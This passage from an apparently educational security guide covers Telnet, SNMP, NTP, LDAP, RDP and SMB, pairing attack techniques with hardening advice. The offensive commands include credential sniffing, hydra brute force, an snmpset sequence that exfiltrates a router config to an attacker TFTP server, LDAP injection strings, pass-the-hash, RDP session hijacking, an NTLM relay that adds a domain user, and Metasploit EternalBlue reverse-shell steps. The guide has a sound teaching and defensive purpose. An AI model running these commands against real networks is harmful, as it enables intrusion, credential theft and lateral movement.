1. **Legacy OT devices:** Many PLCs, RTUs, and industrial switches from the 1990s-2000s only support Telnet. The hardware cannot be upgraded.
2. **Network device management:** Older Cisco IOS, Juniper JunOS, and other network operating systems defaulted to Telnet before SSH became standard.
3. **Vendor management software:** Some SCADA vendors still use Telnet in their proprietary management tools.
4. **Emergency access:** Some environments keep Telnet as a fallback for when SSH certificates expire or configurations break.

### 6.2 Telnet Security Analysis

```bash
# Test if Telnet is open:
nc -zv target_ip 23              # Test connectivity
nmap -sV -p 23 target_ip        # Version + service detection
telnet target_ip                 # Connect manually

# Capture Telnet credentials with tcpdump:
sudo tcpdump -i eth0 -n -A 'port 23' | grep -E "[Pp]assword|[Uu]sername|login:"
# Everything is cleartext — this works reliably

# Capture in Wireshark:
# Filter: tcp.port == 23
# Follow TCP stream → see entire session in cleartext

# Brute force Telnet:
hydra -L users.txt -P passwords.txt telnet://target_ip

# Default credentials worth trying:
# Cisco: admin/admin, cisco/cisco, admin/blank
# Juniper: root/blank (older versions)
# Industrial: admin/admin, admin/1234, operator/operator

# Detect Telnet in enterprise networks:
sudo nmap -sS -p 23 --open 192.168.0.0/16 2>/dev/null
# Any open port 23 in an enterprise environment = immediate finding
```

**Telnet in OT/ICS:**

```
Scope of Telnet in OT environments (2024 reality):
  - Modbus-capable Ethernet adapters: 40-60% support Telnet only
  - Legacy managed switches in substations: often Telnet-only management
  - Some Siemens S7 communications processors: Telnet management
  - Many SCADA data concentrators: Telnet console access
  - Building automation gateways: frequently Telnet-enabled

Assessment approach:
  1. Never assume Telnet is not present — always scan port 23
  2. Never connect via Telnet on production network (credentials captured)
  3. Document finding with: device type, IP, whether default creds work
  4. Remediation path: SSH if supported, isolated management network if not,
     physical console access policy if neither

Compensating controls when Telnet cannot be eliminated:
  - Dedicated management VLAN accessible only from jump server
  - Jump server requires MFA
  - All access logged and monitored
  - Out-of-band management network (physically separate)
  - Network ACL: Telnet accessible ONLY from specific management IPs
```

> **Key Insight:** Finding Telnet open during an assessment means the attacker already has everything they need from the first network-level MITM — complete plaintext credentials and session content. There is no compensating control that makes Telnet acceptable on a network that shares medium with untrusted hosts. Document it, escalate it, eliminate it.

---

## 7. SNMP — Simple Network Management Protocol

### 7.1 SNMP Architecture

SNMP (Simple Network Management Protocol) allows centralised monitoring and management of network devices — routers, switches, servers, printers, UPS systems, PLCs, and virtually any network-connected hardware.

```
SNMP Components:
  Manager: monitoring system (SolarWinds, PRTG, Nagios, Zabbix)
  Agent:   software running on managed device
  MIB:     Management Information Base — the database schema

Communication:
  UDP 161: Manager → Agent (queries, set commands)
  UDP 162: Agent → Manager (traps — unsolicited alerts)

SNMP PDU (Protocol Data Unit) types:
  GetRequest:    Manager asks for specific OID value
  GetNextRequest:Manager asks for next OID (used for table walking)
  GetBulkRequest:Manager asks for multiple OIDs efficiently (v2c+)
  SetRequest:    Manager sets a value on agent (read-write community)
  Response:      Agent replies to Get/Set
  Trap:          Agent sends unsolicited alert (link down, threshold exceeded)
  InformRequest: Trap with acknowledgement (v2c+)
```

**OID — Object Identifier:**

Everything in SNMP is accessed by OID — a hierarchical dotted notation:

```
.1.3.6.1.2.1.1.1.0          sysDescr — System description
.1.3.6.1.2.1.1.3.0          sysUpTime — How long since last restart
.1.3.6.1.2.1.1.5.0          sysName — Device hostname
.1.3.6.1.2.1.2.2.1.2        ifDescr — Interface descriptions
.1.3.6.1.2.1.2.2.1.8        ifOperStatus — Interface status (up/down)
.1.3.6.1.2.1.4.20.1.1       ipAdEntAddr — IP addresses configured
.1.3.6.1.2.1.4.21.1.1       ipRouteDest — Routing table destinations
.1.3.6.1.2.1.4.22.1.2       ipNetToMediaPhysAddress — ARP table
.1.3.6.1.2.1.6.13.1.2       tcpConnLocalAddress — Active TCP connections
.1.3.6.1.4.1.9              Cisco enterprise OID branch
.1.3.6.1.4.1.2636           Juniper enterprise OID branch
```

### 7.2 SNMP Version Security Comparison

```
SNMPv1 (1988):
  Authentication: Community string (plaintext password)
  Encryption: NONE — all data cleartext including community string
  Default communities: "public" (read), "private" (read-write)
  Security: NONE by modern standards
  Still in use: Widely, especially in legacy OT environments
  
SNMPv2c (1993):
  Authentication: Community string (still plaintext)
  Encryption: NONE
  Improvement: Efficiency (GetBulk), performance
  Security: Identical to v1 — still no encryption
  The "c" stands for "community" — acknowledging security not addressed
  
SNMPv3 (2004):
  Authentication: HMAC-MD5 or HMAC-SHA (message authentication)
  Privacy: AES or DES encryption for payload
  Security levels:
    noAuthNoPriv: no authentication, no encryption (= v1/v2c)
    authNoPriv:   authentication only
    authPriv:     authentication + encryption (ONLY secure level)
  Users: individual user accounts instead of community strings
  Status: The only version that should be deployed
```

### 7.3 SNMP Attack Techniques

**SNMP Community String Discovery:**

```bash
# Default community strings to always try:
# public, private, community, snmp, manager, read, write, monitor, 
# default, admin, cisco, juniper, password, secret

# onesixtyone — fast SNMP community string brute force:
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
    192.168.1.0/24
# Scans entire subnet for SNMP with common communities

# nmap SNMP enumeration:
sudo nmap -sU -p 161 --script snmp-brute 192.168.1.1
sudo nmap -sU -p 161 --script snmp-info 192.168.1.1      # Basic info
sudo nmap -sU -p 161 --script snmp-sysdescr 192.168.1.1  # System description

# snmpwalk — walk the entire MIB tree:
snmpwalk -v2c -c public 192.168.1.1                   # All MIB data
snmpwalk -v2c -c public 192.168.1.1 system            # System info only
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.20 # IP address table
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.21 # Routing table
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.22 # ARP table
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.2    # Interfaces

# snmp-check — comprehensive enumeration:
snmp-check -c public -v 2c 192.168.1.1
# Outputs: system info, user accounts, processes, interfaces, routing, ARP cache

# Extract running processes via SNMP (Windows SNMP agent):
snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.2.1.25.4.2
# Reveals: every running process on the Windows machine

# Get Windows installed software via SNMP:
snmpwalk -v2c -c public 192.168.1.100 1.3.6.1.2.1.25.6.3.1.2
```

**SNMP Write Access — Configuration Modification:**

```bash
# If "private" community or another read-write community is found:

# Set a value (change hostname):
snmpset -v2c -c private 192.168.1.1 \
    1.3.6.1.2.1.1.5.0 s "new-hostname"

# On network devices with SNMP write access, attackers can:
# - Change interface descriptions (minor)
# - Modify routing tables (severe — redirect traffic)
# - Shut down interfaces (DoS)
# - Download/upload device config via TFTP (CISCO-CONFIG-COPY-MIB)
# - Modify ACLs (security bypass)

# Cisco: download running-config via SNMP:
snmpset -v2c -c private 192.168.1.1 \
    1.3.6.1.4.1.9.9.96.1.1.1.1.2.1 i 1 \     # protocol = tftp
    1.3.6.1.4.1.9.9.96.1.1.1.1.3.1 i 4 \     # source = running-config
    1.3.6.1.4.1.9.9.96.1.1.1.1.4.1 i 1 \     # destination = file
    1.3.6.1.4.1.9.9.96.1.1.1.1.5.1 a 192.168.1.50 \  # TFTP server IP
    1.3.6.1.4.1.9.9.96.1.1.1.1.6.1 s "router-config.txt" \  # filename
    1.3.6.1.4.1.9.9.96.1.1.1.1.14.1 i 1    # activate
# Router uploads its running configuration to attacker's TFTP server
# Contains: all passwords (potentially), routing config, ACLs, everything
```

**SNMP in OT/ICS Environments:**

```
Reality check on SNMP in industrial networks:
  - Network switches in substations: ~70% still use SNMPv1 or v2c
  - Industrial UPS systems: almost always SNMPv1 with default "public"
  - Environmental monitoring (temperature, humidity): SNMPv1 typical
  - Some PLCs: SNMP agent for monitoring (read-only, but reveals process data)
  - SCADA data concentrators: frequently SNMPv2c for NMS integration

Attack scenario in OT:
  1. Attacker on OT network discovers SNMP v2c with "public" community
  2. snmpwalk reveals all network devices, their IPs, interfaces
  3. ARP table reveals all hosts that have communicated recently
  4. Routing table reveals network topology
  5. Attacker now has complete network map without active scanning
     → Passive, low-noise reconnaissance
  
  With "private" community (still common on legacy switches):
  6. Attacker downloads running configuration of switches
  7. Extracts VLAN configuration, spanning tree, port assignments
  8. May find passwords stored in configuration
  9. Can modify switch configuration to remove port security or ACLs
```

> **Key Insight:** SNMP v1/v2c with default community strings is the most common single vulnerability in industrial network environments. "Public" community string provides read access to the entire network topology — all devices, all connections, all configurations. This is reconnaissance without a single port scan. SNMPv3 with authPriv is the only acceptable configuration.

---

## 8. NTP — Network Time Protocol

### 8.1 Why Time Synchronisation Is a Security Control

NTP (Network Time Protocol, RFC 5905) synchronises clocks across networked devices. This appears mundane until you understand what breaks without accurate time:

```
Security systems that depend on accurate time:

Kerberos authentication:
  Ticket timestamps must be within 5 minutes of server time
  Clock skew > 5 minutes → authentication fails
  Attacker who desynchronises clocks → Kerberos paralysis
  
TLS/SSL certificates:
  Certificate validity is time-bounded (Not Before / Not After)
  Wrong clock → HTTPS connections fail
  
Log correlation:
  Events across multiple systems can only be correlated if timestamps align
  Forensic timeline analysis requires synchronized clocks
  Attacker who desynchronises logs → forensic timeline becomes unreliable
  
File system timestamps:
  Evidence in forensic investigations depends on correct timestamps
  Desynchronisation = corrupted evidence trail
  
ICS Protection Relays:
  Distance protection (zone 1/2/3) relies on precise timing
  PMU (Phasor Measurement Units) require GPS-disciplined NTP for microsecond accuracy
  IEC 61850 GOOSE message timing is time-critical
  IEEE 1588 (PTP — Precision Time Protocol) for sub-microsecond OT timing
```

### 8.2 NTP Architecture and Operation

```
NTP hierarchy (Stratum levels):

Stratum 0: Atomic clocks, GPS receivers, radio clocks — reference clocks
Stratum 1: NTP servers directly connected to Stratum 0 (e.g., time.nist.gov)
Stratum 2: NTP servers synced to Stratum 1 (e.g., pool.ntp.org servers)
Stratum 3: NTP servers synced to Stratum 2 (typical enterprise NTP server)
...
Stratum 15: Maximum usable stratum
Stratum 16: Unsynchronised (clock considered unreliable)

NTP packet exchange (UDP 123):
Client → Server: NTP request (with client's current timestamp)
Server → Client: NTP response (with server timestamps: receive, transmit)
Client calculates: offset, delay, dispersion
Client adjusts local clock gradually (slewing) or jumps (step)
```

### 8.3 NTP Attack Techniques

**NTP Amplification DDoS (CVE-2013-5211):**

```
The monlist attack:
  NTP has a monitoring command called monlist (MON_GETLIST)
  monlist returns: last 600 clients that connected to this NTP server
  
  Attack:
  1. Send monlist request with spoofed source IP (victim's IP)
  2. NTP server sends response to victim
  3. Response is 200-700× larger than request
  4. Amplification factor: 556.9× (officially documented)
  
  Impact:
  With 1 Gbps of spoofed monlist requests → 556 Gbps hits the victim
  Used in 400 Gbps attacks against Cloudflare and CloudFlare customers (2014)
  
Fix: Upgrade ntpd to 4.2.7+ (monlist disabled by default) or:
ntpd configuration: "disable monitor"

Check if NTP server is vulnerable:
ntpdc -n -c monlist target_ntp_server
# If it returns data: vulnerable to amplification

Check with nmap:
nmap -sU -p 123 --script ntp-monlist target_ip
```

**NTP Time Poisoning:**

```
Attack:
  Attacker MITM's NTP traffic (UDP, easy to spoof/inject)
  Sends crafted NTP responses with wrong timestamps
  Victim clock desynchronises
  
  Consequences:
  - Kerberos authentication fails (> 5 minute skew)
  - Certificate validation fails
  - Log timestamps become unreliable
  - ICS timing-dependent processes malfunction
  
  In OT environments (most critical):
  - Protection relays use timestamps for fault location
  - Energy management systems use time for control decisions
  - PMU data becomes unreliable → power system instability
  
Mitigation:
  NTPsec: authenticated NTP with cryptographic signatures
  Symmetric key authentication in NTP (ntpd configuration)
  PTP (Precision Time Protocol, IEEE 1588) with hardware timestamping for OT
  Multiple NTP sources — single compromised source rejected by median filter
  
Configure NTP authentication:
# /etc/ntp.conf:
server 192.168.1.1 key 1
keys /etc/ntp.keys
trustedkey 1
requestkey 1
controlkey 1

# /etc/ntp.keys:
1 MD5 secretpassword123
```

```bash
# Check current time synchronisation:
timedatectl status              # Linux
chronyc tracking               # If using chrony
ntpq -p                        # If using ntpd — shows peer status

# NTP reconnaissance:
nmap -sU -p 123 --script ntp-info target_ip        # NTP version, reference clock
nmap -sU -p 123 --script ntp-monlist target_ip      # Monlist vulnerability

# Check NTP server stratum:
ntpdate -q ntp_server_ip        # Query without setting clock

# Monitor NTP traffic:
sudo tcpdump -i eth0 -n 'udp port 123'
```

> **Key Insight:** NTP is a quiet protocol that most administrators configure once and forget. But time synchronisation is a prerequisite for every authentication system (Kerberos, certificates), every forensic investigation (log correlation), and every timing-critical OT system (protection relays, PMUs). An attacker who desynchronises clocks causes authentication failures system-wide and destroys the forensic timeline. NTP security — using authenticated NTP and multiple sources — deserves attention proportional to the systems that depend on it.

---

## 9. LDAP — Lightweight Directory Access Protocol

### 9.1 LDAP and Active Directory

LDAP (Lightweight Directory Access Protocol, RFC 4511) is the protocol used to query and modify directory services. In enterprise environments, LDAP is the interface to Active Directory — the system that manages every user, computer, group, and policy in the Windows domain.

```
LDAP operates on:
  Port 389: LDAP (cleartext)
  Port 636: LDAPS (LDAP over TLS)
  Port 3268: Global Catalog LDAP
  Port 3269: Global Catalog LDAPS

Directory structure (Distinguished Name — DN):
  DC=company,DC=com                   ← Domain root
  ├── OU=Users                        ← Organizational Units
  │   ├── CN=John Smith               ← User object
  │   └── CN=Jane Doe
  ├── OU=Computers
  │   ├── CN=WORKSTATION01
  │   └── CN=SERVER01
  ├── OU=Groups
  │   ├── CN=Domain Admins            ← Group object
  │   └── CN=IT Staff
  └── CN=Builtin                      ← Built-in objects
```

**LDAP Queries — The Foundation of AD Enumeration:**

```
LDAP query components:
  Base DN:    Where to start searching (DC=company,DC=com)
  Scope:      BASE (one object), ONE (one level), SUB (subtree)
  Filter:     What to match ((objectClass=user), (&(objectClass=user)(memberOf=...)))
  Attributes: What to return (sAMAccountName, mail, memberOf, ...)

Common LDAP filters for AD enumeration:
  (objectClass=user)              All user objects
  (objectClass=computer)          All computer objects
  (objectClass=group)             All group objects
  (&(objectClass=user)(sAMAccountName=john))  Specific user
  (&(objectClass=user)(memberOf=CN=Domain Admins,CN=Builtin,DC=company,DC=com))
                                  All Domain Admin members
  (adminCount=1)                  Protected users (all privileged accounts)
  (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))
                                  Accounts with "password never expires"
  (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))
                                  Disabled accounts
  (servicePrincipalName=*)        Accounts with SPNs (Kerberoasting targets!)
  (&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(userAccountControl:1.2.840.113556.1.4.803:=4194304))
                                  AS-REP Roasting targets (no pre-auth required)
```

### 9.2 LDAP in Attack Workflows

**Anonymous LDAP Bind (Null Bind):**

```bash
# Check if null bind (anonymous authentication) is allowed:
ldapsearch -x -H ldap://target_dc -b "" -s base "(objectClass=*)" namingContexts
# -x: simple authentication
# -H: LDAP server URI
# -b "": search base (empty for root DSE)
# -s base: scope = base only
# If success: shows naming contexts (domain names) without credentials

# Check if null bind allows reading AD:
ldapsearch -x -H ldap://192.168.1.10 -b "DC=company,DC=com" "(objectClass=user)" sAMAccountName
# If returns user list without credentials: critical misconfiguration
```

**Authenticated LDAP Enumeration:**

```bash
# With valid domain credentials (regular user is enough):
ldapsearch -x -H ldap://dc.company.com \
    -D "CN=john,OU=Users,DC=company,DC=com" \
    -w password \
    -b "DC=company,DC=com" \
    "(objectClass=user)" \
    sAMAccountName mail memberOf

# Find Domain Admins:
ldapsearch -x -H ldap://dc.company.com \
    -D "john@company.com" -w password \
    -b "DC=company,DC=com" \
    "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Builtin,DC=company,DC=com))" \
    sAMAccountName

# Find Kerberoastable accounts (have SPN):
ldapsearch -x -H ldap://dc.company.com \
    -D "john@company.com" -w password \
    -b "DC=company,DC=com" \
    "(servicePrincipalName=*)" \
    sAMAccountName servicePrincipalName

# PowerShell (Windows):
# Get-ADUser -Filter * -Properties * | Select sAMAccountName,Enabled,PasswordNeverExpires
# Get-ADGroupMember "Domain Admins" | Select Name,SamAccountName
```

**Tools for LDAP/AD Enumeration:**

```bash
# BloodHound — graphical AD attack path analysis
# Requires: BloodHound + Neo4j database
# SharpHound collector (run on Windows):
.\SharpHound.exe -c All                # Collect all data

# BloodHound.py (Python, run from Linux):
bloodhound-python -u john -p password -d company.com -dc dc.company.com -c All

# Import to BloodHound GUI and find:
# - Shortest path to Domain Admin
# - Users with never-expiring passwords
# - Kerberoastable accounts
# - AS-REP Roastable accounts

# ldapdomaindump — comprehensive AD dump:
ldapdomaindump -u company\\john -p password dc.company.com
# Outputs HTML/JSON reports of all users, computers, groups, GPOs

# PowerView (PowerShell, requires domain user):
# Import-Module PowerView.ps1
# Get-DomainUser
# Get-DomainGroupMember "Domain Admins"
# Get-DomainComputer
# Invoke-Kerberoast -OutputFormat Hashcat
```

**LDAP Injection:**

```
If an application builds LDAP queries from user input without sanitisation:

Vulnerable query construction:
  (&(objectClass=user)(sAMAccountName=USERINPUT))
  
User input: admin)(&)
Resulting query: (&(objectClass=user)(sAMAccountName=admin)(&))
Effect: bypass authentication (always true)

User input: *
Resulting query: (&(objectClass=user)(sAMAccountName=*))
Effect: returns ALL users (information disclosure)

Test for LDAP injection:
  In login username field: *)(&
  In search fields: *)(objectClass=*
  
Tools: 
  Burp Suite: manually modify parameters and observe response
  LDAPi: LDAP injection testing tool
```

> **Key Insight:** LDAP is the query language for Active Directory — the identity backbone of every enterprise. Any user with a domain account can query LDAP extensively. This is by design (employees need to look up contacts). But it means every domain user can enumerate all users, computers, groups, and service accounts. BloodHound leverages LDAP enumeration to graphically display every privilege escalation path to Domain Admin. In OT environments, LDAP queries from OT machines to the corporate AD represent a data flow that attackers exploit for lateral movement.

---

## 10. RDP — Remote Desktop Protocol

### 10.1 RDP Architecture

RDP (Remote Desktop Protocol) provides graphical remote access to Windows systems. It runs over TCP port 3389 (and UDP 3389 for enhanced performance in RDP 8+).

```
RDP connection establishment:
1. TCP handshake (port 3389)
2. RDP Connection Request — negotiates protocols
3. Server sends X.224 Connection Confirm
4. Negotiates security: SSL/TLS, CredSSP (NLA), or RDP security
5. License exchange (server verifies client licenses)
6. Capabilities exchange (color depth, audio, clipboard, drive redirection)
7. Authentication (CredSSP/NLA sends credentials before desktop)
8. Channel setup (virtual channels for clipboard, audio, drive, printer)
9. Bitmap updates begin — graphical desktop sent

Security mechanisms:
  Classic RDP security: RC4 encryption of bitmap data (WEAK — deprecated)
  TLS: Transport layer encryption (better)
  Network Level Authentication (NLA): Credentials authenticated BEFORE
      desktop loads. Server validates user before creating session.
      Prevents unauthenticated resource exhaustion.
```

### 10.2 RDP Vulnerabilities

**BlueKeep (CVE-2019-0708):**

```
Discovery: May 2019, Microsoft
Severity: CVSS 9.8 — Critical
Affected: Windows XP, Vista, 7, Server 2003, Server 2008, Server 2008 R2
Impact: Remote code execution, no authentication required, wormable

How it works:
  RDP uses "channels" for different data types
  MS_T120 channel — a bug in how RDP handles this channel's binding
  Attacker sends malformed MS_T120 bind request
  Use-after-free vulnerability in the RDP driver (rdpwdd.sys)
  Achieves kernel-level code execution
  
Why it was terrifying:
  - No credentials required (pre-auth)
  - No user interaction
  - Kernel-level (SYSTEM) compromise
  - Wormable — could spread automatically (like WannaCry)
  - ~1 million vulnerable systems exposed to internet at time of disclosure
  - Microsoft issued patches for out-of-support Windows XP (first time since 2014)
  
Exploitation:
  Metasploit module: exploit/windows/rdp/cve_2019_0708_bluekeep_rce
  Public PoCs available
  
Mitigations:
  Patch (KB4499175 for Server 2008, KB4499180 for Windows 7)
  Enable NLA (unauthenticated connection attempt rejected before code reaches vulnerability)
  Block external RDP (firewall port 3389 from internet)
  Disable RDP if not needed
```

**DejaBlue (CVE-2019-1181, CVE-2019-1182):**

```
Discovery: August 2019 (two months after BlueKeep)
Affected: Windows 8, 10, Server 2012, 2016, 2019 (newer systems — BlueKeep missed these)
Impact: Pre-auth, unauthenticated RCE (same class as BlueKeep)
Wormable: Yes
Mitigation: Patch (August 2019 Patch Tuesday)
```

**PrintNightmare via RDP (CVE-2021-1675, CVE-2021-34527):**

```
While a different vulnerability (Print Spooler), RDP was often the initial access vector:
  1. BlueKeep/DejaBlue for initial RDP access
  2. PrintNightmare for privilege escalation to SYSTEM
  Combined: full attack chain from network to SYSTEM
```

### 10.3 RDP Attack Techniques

```bash
# Scan for RDP:
nmap -sV -p 3389 192.168.1.0/24
nmap -sV -p 3389 --script rdp-enum-encryption target_ip

# Check encryption level and NLA requirement:
nmap --script rdp-enum-encryption -p 3389 target_ip
# Outputs supported security protocols

# Brute force RDP:
hydra -L users.txt -P passwords.txt rdp://target_ip
crowbar -b rdp -s target_ip -u admin -C passwords.txt

# Check BlueKeep vulnerability:
nmap --script rdp-vuln-ms12-020 -p 3389 target_ip
# Or use Metasploit scanner:
# use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
# set RHOSTS target_ip
# run

# RDP screenshot without credentials (if CredSSP disabled):
# nmap script or specific PoC tools

# Pass-the-Hash via RDP:
# With NTLM hash (not password):
xfreerdp /u:Administrator /pth:NTLM_HASH /v:target_ip
# This works when NLA uses NTLM authentication (not Kerberos)

# Capture RDP credentials from network (requires MITM position):
# Seth: https://github.com/SySS-Research/Seth
# Performs MITM, downgrades RDP security, captures credentials
python seth.py eth0 target_ip gateway_ip
```

**RDP Session Hijacking:**

```
On a Windows system as SYSTEM, you can hijack existing RDP sessions
without knowing the user's password:

# List all sessions:
query session        # or: qwinsta

# Output:
# SESSIONNAME  USERNAME  ID  STATE   TYPE   DEVICE
# console      alice     1   Active
# rdp-tcp#0    bob       2   Active

# Hijack Bob's session (as SYSTEM, no password needed):
tscon 2 /dest:console
# This moves Bob's session to the console, giving you his desktop as Bob
# Bob gets disconnected

# Alternative method:
sc create MyService binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#3"
net start MyService
# Creates a service as SYSTEM, executes tscon as SYSTEM → hijack

# This is used for:
# - Lateral movement (pivot from low-privilege RDP session to higher-privilege)
# - Credential access (Bob's session has his email, credentials cached)
# - Persistence (maintain access through legitimate-looking session)
```

### 10.4 RDP Hardening

```
1. Require Network Level Authentication (NLA):
   gpedit.msc → Computer Configuration → Windows Settings →
   Security Settings → Local Policies → Security Options →
   "Require user authentication for remote connections" → Enabled
   
   Or via registry:
   HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
   UserAuthentication = 1

2. Limit RDP access by firewall:
   Only allow RDP from specific management IPs
   Never expose RDP to the internet directly
   
3. Use RDP Gateway:
   HTTPS-based gateway for RDP access from internet
   Single point with MFA, audit logging, session recording

4. Restrict user accounts that can RDP:
   Only specific accounts in "Remote Desktop Users" group
   Never allow default Administrator account to RDP

5. Account lockout policy:
   Lock account after 5 failed attempts for 30 minutes
   Mitigates brute force

6. Idle session limits:
   Disconnect idle sessions (prevent session hijacking window)
   "Set time limit for disconnected sessions" = 1 hour

7. RDP on non-standard port (minimal security benefit):
   Reduces automated scanning noise, but determined attacker scans all ports
   Not a substitute for any real control

8. Enable RDP logging:
   Event IDs:
   4624 (Logon Type 10): Successful RDP logon
   4625: Failed RDP logon
   4778: RDP session reconnected
   4779: RDP session disconnected
```

> **Key Insight:** RDP is the single most exposed Windows service on the internet. Over 3.5 million RDP endpoints are directly exposed to the internet (Shodan, 2024). BlueKeep, DejaBlue, and a series of subsequent vulnerabilities have repeatedly demonstrated pre-authentication RCE against RDP. The only acceptable exposure posture is: RDP never directly on internet, always through VPN or RDP Gateway with MFA, NLA mandatory, account lockout active.

---

## 11. SMB — Server Message Block

### 11.1 SMB Architecture

SMB (Server Message Block) is the Windows file and printer sharing protocol. It enables:
- File and directory access across the network
- Printer sharing
- Named pipes (inter-process communication, including RPC)
- Authentication via NTLM or Kerberos

```
SMB Ports:
  TCP 445: Direct SMB (modern, preferred)
  TCP 139: SMB over NetBIOS Session Service (legacy)
  UDP 137: NetBIOS Name Service
  UDP 138: NetBIOS Datagram Service

SMB Versions:
  SMB 1.0 (1983): Original. No encryption. Multiple critical vulnerabilities.
                  MUST be disabled everywhere. EternalBlue exploits SMBv1.
  SMB 2.0 (2006): Vista/Server 2008. Significantly improved performance and security.
  SMB 2.1 (2010): Windows 7/Server 2008 R2. Minor improvements.
  SMB 3.0 (2012): Windows 8/Server 2012. Encryption support (AES-128-CCM).
  SMB 3.0.2 (2014): Improvements.
  SMB 3.1.1 (2015): Windows 10/Server 2016. Pre-authentication integrity,
                    AES-128-GCM encryption, secure negotiation.
```

### 11.2 SMB Authentication — NTLM and Kerberos

SMB authentication uses either NTLM (challenge-response) or Kerberos. Understanding the authentication flow is essential because it is the foundation of many Windows attack techniques.

**NTLM Authentication Flow:**

```
Client                                    Server
  │                                          │
  │──── Session Setup (NTLMSSP_NEGOTIATE) →  │
  │                                          │
  │ ←── Challenge (8-byte random nonce) ──── │
  │                                          │
  │──── Response ───────────────────────→    │
  │     NT Hash = MD4(password)              │
  │     Response = HMAC-MD5(NT_Hash,         │
  │                challenge + client_nonce)  │
  │     Username, domain, workstation        │
  │                                          │
  │   [Server validates response with DC]    │
  │ ←── Session Setup Response ──────────── │
```

**Pass-the-Hash:**

```
Attack discovered by Paul Ashton, 1997:
  NTLM authentication uses the NT Hash of the password, not the password itself
  If attacker obtains the NT Hash (from memory dump, SAM, NTDS.dit):
  Attacker can authenticate AS THAT USER without knowing the password
  
Tools:
  impacket-smbexec: smbexec.py -hashes ':NTLM_HASH' DOMAIN/Administrator@target
  impacket-wmiexec: wmiexec.py -hashes ':NTLM_HASH' DOMAIN/Administrator@target
  CrackMapExec: cme smb target -u Administrator -H NTLM_HASH
  Mimikatz (local PTH): sekurlsa::pth /user:Administrator /domain:. /ntlm:HASH /run:cmd
  
  pth-winexe (Kali): pth-winexe -U Administrator%HASH //target cmd.exe
```

**NTLM Relay Attack:**

```
Attack:
  NTLM authentication can be relayed to another host
  If victim authenticates to attacker, attacker relays credentials to a third server
  Attacker gains access to third server AS the victim user
  
Scenario:
  1. Attacker runs Responder (LLMNR/NBT-NS poisoner)
  2. Victim's machine tries to connect to \\mistyped-server
  3. LLMNR broadcast: "Who is mistyped-server?"
  4. Responder answers: "I am mistyped-server"
  5. Victim sends NTLM authentication to Responder/attacker
  6. Attacker relays this authentication to real target server (e.g., DC)
  7. Attacker gains access to target server as victim user
  
  If victim is Domain Admin: attacker gets Domain Admin on the target
  
Tool: impacket ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support
# While Responder captures hashes, ntlmrelayx relays them

# Combined attack:
# Terminal 1: responder -I eth0 -A (analyse mode, no poisoning — ntlmrelayx does that)
# Terminal 2: ntlmrelayx.py -tf targets.txt -smb2support
# Or for domain admin: ntlmrelayx.py -tf dcs.txt -smb2support -c "net user attacker Password1 /add /domain"
```

### 11.3 EternalBlue — The Most Destructive Exploit in History

```
CVE-2017-0144 (EternalBlue):
  Discovered by: NSA (leaked by Shadow Brokers, April 2017)
  Patched: MS17-010 (March 2017, before Shadow Brokers leak)
  
  Vulnerability: SMBv1 transaction handling buffer overflow
  Impact: Remote code execution as SYSTEM, no authentication required
  
  WannaCry (May 2017):
    Used EternalBlue + DoublePulsar (NSA backdoor installer)
    200,000 victims in 150 countries in 72 hours
    NHS UK: 80 hospitals affected, surgeries cancelled, patient records inaccessible
    Telefónica, FedEx, Renault, Deutsche Bahn, Russia's Interior Ministry
    Total damage: $4 billion+
    
  NotPetya (June 2017):
    Also used EternalBlue
    Disguised as ransomware, actually a destructive wiper
    Specifically targeted Ukraine but spread globally
    Maersk: $300 million loss, had to reinstall 45,000 PCs, 4,000 servers, 2,500 apps
    Merck: $870 million loss
    FedEx (TNT): $400 million loss
    Total damage: $10 billion+
    Classified as "most destructive cyberattack in history"
    
  Key lesson: Unpatched SMBv1 was the entry point.
              The vulnerability was known and patched before WannaCry.
              Both attacks were entirely preventable.
```

### 11.4 SMB Enumeration and Attacks

```bash
# Check SMBv1 status:
nmap --script smb-protocols -p 445 target_ip
# Output shows supported SMB versions

# Check for EternalBlue vulnerability:
nmap --script smb-vuln-ms17-010 -p 445 target_ip

# List SMB shares (null session):
smbclient -L //target_ip -N              # -N = no password (null session)
smbclient -L //target_ip -U anonymous   # Anonymous authentication

# List shares with credentials:
smbclient -L //target_ip -U username%password
impacket-smbclient username:password@target_ip

# CrackMapExec — comprehensive SMB assessment:
cme smb 192.168.1.0/24                              # Enumerate all SMB hosts
cme smb 192.168.1.100 -u admin -p password          # Authenticate
cme smb 192.168.1.100 -u admin -p password --shares # List shares
cme smb 192.168.1.100 -u admin -p password --users  # List domain users
cme smb 192.168.1.100 -u admin -p password --groups # List groups
cme smb 192.168.1.100 -u admin -p password -x "ipconfig" # Execute command

# Check SMB signing:
nmap --script smb2-security-mode -p 445 192.168.1.0/24
cme smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
# "Message signing enabled but not required" = vulnerable to NTLM relay

# Enumerate shares and find readable ones:
smbmap -H target_ip                                # List all shares + permissions
smbmap -H target_ip -u admin -p password -R        # Recursive listing

# Access a share:
smbclient //target_ip/share_name -U username%password
# smb: \> ls         ← list files
# smb: \> get file   ← download file
# smb: \> put file   ← upload file

# Exploit EternalBlue with Metasploit:
# use exploit/windows/smb/ms17_010_eternalblue
# set RHOSTS target_ip
# set PAYLOAD windows/x64/meterpreter/reverse_tcp
# set LHOST your_ip
# run
```

**SMB Hardening:**

```powershell
# Disable SMBv1 (Windows Server):
Set-SmbServerConfiguration -EnableSMB1Protocol $false
Get-SmbServerConfiguration | Select EnableSMB1Protocol  # Verify

# Or via registry:
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
    SMB1 -Type DWORD -Value 0

# Enable SMB signing (prevents NTLM relay):
